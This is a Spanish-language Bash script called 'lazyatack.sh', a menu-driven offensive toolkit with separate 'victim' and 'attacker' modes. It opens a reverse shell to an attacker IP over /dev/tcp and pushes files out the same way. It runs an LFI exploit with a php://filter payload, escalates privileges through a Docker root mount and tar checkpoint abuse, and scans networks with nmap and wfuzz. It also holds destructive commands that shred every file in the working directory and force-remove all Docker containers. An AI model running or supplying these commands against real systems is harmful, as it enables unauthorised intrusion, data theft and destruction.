#!/bin/bash

################################################################################
# Nombre del script: lazyatack.sh
# Autor: Gris Iscomeback
# Correo electrónico: grisiscomeback[at]gmail[dot]com
# Fecha de creación: 09/06/2024
# Descripción: Este script contiene la lógica principal de la aplicación. LazyAtack
# Licencia: GPL v3
################################################################################

# Banner
echo "██╗      █████╗ ███████╗██╗   ██╗ ██████╗ ██╗    ██╗███╗   ██╗"
echo "██║     ██╔══██╗╚══███╔╝╚██╗ ██╔╝██╔═══██╗██║    ██║████╗  ██║"
echo "██║     ███████║  ███╔╝  ╚████╔╝ ██║   ██║██║ █╗ ██║██╔██╗ ██║"
echo "██║     ██╔══██║ ███╔╝    ╚██╔╝  ██║   ██║██║███╗██║██║╚██╗██║"
echo "███████╗██║  ██║███████╗   ██║   ╚██████╔╝╚███╔███╔╝██║ ╚████║"
echo "╚══════╝╚═╝  ╚═╝╚══════╝   ╚═╝    ╚═════╝  ╚══╝╚══╝ ╚═╝  ╚═══╝"

# Función para mostrar ayuda
function mostrar_ayuda {
    echo "Uso: $0 --modo MODO --url URL --ip IP_VICTIMA --atacante IP_ATACANTE"
    echo ""
    echo "Opciones:"
    echo "  --modo       Modo de operación (servidor o cliente)"
    echo "  --url        URL de la víctima (requerido en modo cliente)"
    echo "  --ip         IP de la víctima (requerido en modo cliente)"
    echo "  --atacante   IP del atacante (requerido en modo servidor)"
    exit 1
}

# Función para validar una dirección IP
function validar_ip {
    local ip=$1
    local valid_regex='^([0-9]{1,3}\.){3}[0-9]{1,3}$'
    if [[ $ip =~ $valid_regex ]]; then
        for segment in $(echo $ip | tr "." "\n"); do
            if ((segment < 0 || segment > 255)); then
                return 1
            fi
        done
        return 0
    else
        return 1
    fi
}

# Función para validar URL
function validar_url {
    if [[ $(curl -o /dev/null --silent --head --write-out '%{http_code}\n' "$1") -ne 200 ]]; then
        return 1
    fi
    return 0
}

# Manejo de errores
set -e

# Comprobación de parámetros
if [[ $# -lt 2 ]]; then
    mostrar_ayuda
fi

# Procesamiento de parámetros
while [[ $# -gt 0 ]]; do
    case $1 in
        --modo)
            MODO="$2"
            shift 2
            ;;
        --url)
            URL_VICTIMA="$2"
            if ! validar_url "$URL_VICTIMA"; then
                echo "URL inválida: $URL_VICTIMA"
                exit 1
            fi
            shift 2
            ;;
        --ip)
            IP_VICTIMA="$2"
            if ! validar_ip "$IP_VICTIMA"; then
                echo "IP inválida: $IP_VICTIMA"
                exit 1
            fi
            shift 2
            ;;
        --atacante)
            IP_ATACANTE="$2"
            if ! validar_ip "$IP_ATACANTE"; then
                echo "IP inválida: $IP_ATACANTE"
                exit 1
            fi
            shift 2
            ;;
        *)
            mostrar_ayuda
            ;;
    esac
done

# Solicitar el nombre del archivo para la shell reversa en modo cliente
if [[ $MODO == "cliente" ]]; then
    read -p "Ingrese el nombre del archivo para la shell reversa: " FILE_SHELL
fi

# Función para descargar y extraer SecLists
function descargar_seclists {
    echo "Descargando y extrayendo SecLists..."
    wget -c https://github.com/danielmiessler/SecLists/archive/master.zip -O SecList.zip \
    && unzip SecList.zip \
    && rm -f SecList.zip
}

# Función para ejecutar escaneo de puertos con nmap
function escanear_puertos {
    echo "Ejecutando escaneo de puertos con nmap en la red local..."
    sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn $IP_VICTIMA/24
}

# Función para escanear puertos específicos
function escanear_puertos_especificos {
    echo "Escaneando puertos 22, 80 y 443 en $IP_VICTIMA..."
    nmap -p22,80,443 -sCV $IP_VICTIMA -oN router
}

# Función para enumerar servicios HTTP
function enumerar_http {
    echo "Enumerando servicios HTTP en $URL_VICTIMA..."
    nmap --script http-enum -p 80 $URL_VICTIMA -oN fileScan
}

# Función para iniciar servidor HTTP con Python
function iniciar_servidor_http {
    echo "Iniciando servidor HTTP en el puerto 80..."
    python -m http.server 80 &
}

# Función para configurar netcat
function configurar_netcat {
    echo "Configurando netcat para escuchar en el puerto 443..."
    nc -nlvp 443 > $FILE_SHELL &
}

# Función para enviar archivo mediante bash a netcat
function enviar_archivo_netcat {
    echo "Enviando archivo a la escucha netcat..."
    cat $FILE_SHELL > /dev/tcp/$IP_ATACANTE/443
}

# Función para verificar conectividad con ping y tcpdump
function verificar_conectividad {
    echo "Verificando conectividad con ping y tcpdump..."
    ping -c 1 $IP_ATACANTE
    tcpdump -i mon0 icmp -n
}

# Función para verificar conectividad con curl
function verificar_curl {
    echo "Verificando conectividad con curl..."
    curl $IP_ATACANTE
    python -m http.server 80 &
}

# Función para configurar una shell reversa
function configurar_shell_reversa {
    echo "Configurando shell reversa..."
    bash -i >& /dev/tcp/$IP_ATACANTE/443 0>&1 &
}

# Función para escuchar shell con netcat
function escuchar_shell {
    echo "Escuchando shell con netcat..."
    nc -nlvp 443 &
}

# Función para monitorear procesos
function monitorear_procesos {
    echo "Iniciando monitorización de procesos..."
    old_process=$(ps -eo user,command)
    while true; do
        new_process=$(ps -eo user,command)
        diff <(echo "$old_process") <(echo "$new_process") | grep "[\>\<]" | grep -vE "procmon|kworker"
        sleep 1
    done &
}

# Función para ejecutar wfuzz
function ejecutar_wfuzz {
    echo "Enumerando directorios web con wfuzz..."
    wfuzz -c -L --hc=404 -t 200 -w /usr/share/seclist/SecLists-master/Discovery/Web-Content/directory-list-2.3-medium.txt "http://$IP_VICTIMA:80/FUZZ"
}

# Función para comprobar permisos sudo
function comprobar_sudo {
    echo "Comprobando permisos sudo..."
    sudo -l
}

# Función para explotar LFI
function explotar_lfi {
    echo "Explotando vulnerabilidad LFI..."
    curl "http://$URL_VICTIMA/index.php?vuln_lfi_var=php://filter/convert.base64-encode/resource=index.php"
}

# Función para configurar TTY
function configurar_tty {
    echo "Configurando TTY..."
    script /dev/null -c bash
    stty raw -echo; fg
    reset xterm
    export TERM=xterm
    stty size
    stty rows 44 columns 184
}

# Función para eliminar archivos de forma segura
function eliminar_archivos {
    echo "Eliminando archivos de forma segura..."
    shred -zum 10 -v *
}

# Función para obtener root shell mediante Docker
function obtener_root_shell {
    echo "Obteniendo root shell mediante Docker..."
    docker run -v /:/mnt --rm -it alpine chroot /mnt sh
    sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh
}

# Función para enumerar archivos con SUID
function enumerar_suid {
    echo "Enumerando archivos con permisos SUID..."
    find / -perm 4000 -ls 2>/dev/null
}

# Función para listar timers de systemd
function listar_timers {
    echo "Listando timers de systemd..."
    systemctl list-timers
}

# Función para comprobar rutas de comandos
function comprobar_rutas {
    echo "Comprobando rutas de comandos..."
    which comando
}

# Función para abusar de tar
function abusar_tar {
    echo "Abusando de tar para ejecutar shell..."
    tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
}

# Función para enumerar puertos abiertos
function enumerar_puertos {
    echo "Enumerando puertos abiertos..."
    cat /proc/net/tcp | awk '{print $2}' | grep -v address | awk '{print $2}' FS=":" | sort -u | while read port; do echo "[+] Puerto: $port -> $((0x$port))"; done
}

# Función para eliminar contenedores Docker
function eliminar_contenedores_docker {
    echo "Eliminando todos los contenedores Docker..."
    docker rm $(docker ps -a -q) --force
}

# Función para escanear red
function escanear_red {
    echo "Escaneando red con secuencia y xargs..."
    seq 1 254 | xargs -P50 -I {} nmap -sT -Pn -p80 -open -T5 -v -n $IP_VICTIMA.{} 2>&1 | grep open
}

# Función para mostrar menú en modo servidor
function menu_servidor {
    echo "Modo Servidor (Máquina Víctima)"
    PS3="Seleccione una opción: "
    options=("Iniciar servidor HTTP" "Configurar netcat" "Enviar archivo mediante bash a netcat" "Verificar conectividad" "Configurar shell reversa" "Escuchar shell con netcat" "Salir")
    select opt in "${options[@]}"; do
        case $opt in
            "Iniciar servidor HTTP")
                iniciar_servidor_http
                ;;
            "Configurar netcat")
                configurar_netcat
                ;;
            "Enviar archivo mediante bash a netcat")
                enviar_archivo_netcat
                ;;
            "Verificar conectividad")
                verificar_conectividad
                ;;
            "Configurar shell reversa")
                configurar_shell_reversa
                ;;
            "Escuchar shell con netcat")
                escuchar_shell
                ;;
            "Salir")
                exit 0
                ;;
            *)
                echo "Opción inválida"
                ;;
        esac
    done
}

# Función para mostrar menú en modo cliente
function menu_cliente {
    echo "Modo Cliente (Máquina Atacante)"
    PS3="Seleccione una opción: "
    options=("Descargar SecLists" "Escanear puertos" "Escanear puertos específicos" "Enumerar servicios HTTP" "Verificar conectividad con curl" "Monitorear procesos" "Ejecutar wfuzz" "Comprobar permisos sudo" "Explotar LFI" "Configurar TTY" "Eliminar archivos de forma segura" "Obtener root shell mediante Docker" "Enumerar archivos con SUID" "Listar timers de systemd" "Comprobar rutas de comandos" "Abusar de tar" "Enumerar puertos abiertos" "Eliminar contenedores Docker" "Escanear red" "Salir")
    select opt in "${options[@]}"; do
        case $opt in
            "Descargar SecLists")
                descargar_seclists
                ;;
            "Escanear puertos")
                escanear_puertos
                ;;
            "Escanear puertos específicos")
                escanear_puertos_especificos
                ;;
            "Enumerar servicios HTTP")
                enumerar_http
                ;;
            "Verificar conectividad con curl")
                verificar_curl
                ;;
            "Monitorear procesos")
                monitorear_procesos
                ;;
            "Ejecutar wfuzz")
                ejecutar_wfuzz
                ;;
            "Comprobar permisos sudo")
                comprobar_sudo
                ;;
            "Explotar LFI")
                explotar_lfi
                ;;
            "Configurar TTY")
                configurar_tty
                ;;
            "Eliminar archivos de forma segura")
                eliminar_archivos
                ;;
            "Obtener root shell mediante Docker")
                obtener_root_shell
                ;;
            "Enumerar archivos con SUID")
                enumerar_suid
                ;;
            "Listar timers de systemd")
                listar_timers
                ;;
            "Comprobar rutas de comandos")
                comprobar_rutas
                ;;
            "Abusar de tar")
                abusar_tar
                ;;
            "Enumerar puertos abiertos")
                enumerar_puertos
                ;;
            "Eliminar contenedores Docker")
                eliminar_contenedores_docker
                ;;
            "Escanear red")
                escanear_red
                ;;
            "Salir")
                exit 0
                ;;
            *)
                echo "Opción inválida"
                ;;
        esac
    done
}

# Ejecución según el modo seleccionado
trap "echo 'Saliendo...'; exit 0" SIGINT
case $MODO in
    servidor)
        menu_servidor
        ;;
    cliente)
        menu_cliente
        ;;
    *)
        mostrar_ayuda
        ;;
esac
